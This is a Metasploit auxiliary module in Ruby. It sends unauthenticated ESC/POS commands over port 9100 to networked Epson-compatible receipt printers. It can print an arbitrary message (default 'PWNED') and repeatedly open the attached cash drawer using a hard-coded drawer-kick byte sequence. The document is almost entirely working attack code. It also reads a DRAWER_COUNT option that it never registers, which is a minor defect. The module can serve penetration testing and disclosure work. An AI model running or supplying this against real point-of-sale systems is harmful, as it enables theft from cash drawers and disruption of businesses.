
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ESC/POS Printer Command Injector',
      'Description' => %q{
        This module exploits an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers.
        You can print a custom message, trigger the attached cash drawer, or do both.
      },
      'Author'      => ['FutileSkills'],
      'License'     => MSF_LICENSE,
      'References'  => [
        ['URL', 'https://github.com/futileskills/Security-Advisory']
      ],
      
    ))

        register_options(
          [
            Opt::RPORT(9100),
            OptString.new('MESSAGE', [true, 'Message to print', 'PWNED'], conditions: %w[PRINT_MESSAGE]),
            OptBool.new('TRIGGER_DRAWER', [false, 'Trigger the attached cash drawer', false]),
            OptBool.new('PRINT_MESSAGE', [false, 'Print the specified message', false]),
          ]
        )
      end

  # ESC/POS command to trigger the cash drawer
  DRAWER_COMMAND = "\x1b\x70\x00\x19\x32".freeze

  def run
      rhost_ip = rhost
      message = datastore['MESSAGE']
      trigger_drawer = datastore['TRIGGER_DRAWER']
      print_message = datastore['PRINT_MESSAGE']
      drawer_count = datastore['DRAWER_COUNT'].to_i.clamp(1, 10)  # Clamp for safety

      if print_message
        send_print(rhost_ip, message)
      end

      if trigger_drawer
        send_drawer(rhost_ip, drawer_count)
      end

      unless print_message || trigger_drawer
        print_error('No action specified. Please set either TRIGGER_DRAWER or PRINT_MESSAGE to true.')
      end
    end

  def send_print(rhost_ip, message)
    print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n\x1d\x56\x42"
    print_status("Sending print message to #{rhost_ip}...")
    begin
      connect
      sock.put(print_commands)
      disconnect
      print_good("Printed message to #{rhost_ip}")
    rescue ::Rex::ConnectionError
      print_error("Failed to connect to #{rhost_ip} for printing")
    end
  end

  def send_drawer(rhost_ip, count)
    print_status("Triggering cash drawer #{count} times on #{rhost_ip}...")
    count.times do
      begin
        connect
        sock.put(DRAWER_COMMAND)
        disconnect
        sleep(0.5)
      rescue ::Rex::ConnectionError
        print_error("Failed to connect to #{rhost_ip} for drawer trigger")
        break
      end
    end
    print_good("Triggered cash drawer on #{rhost_ip}")
  end
end
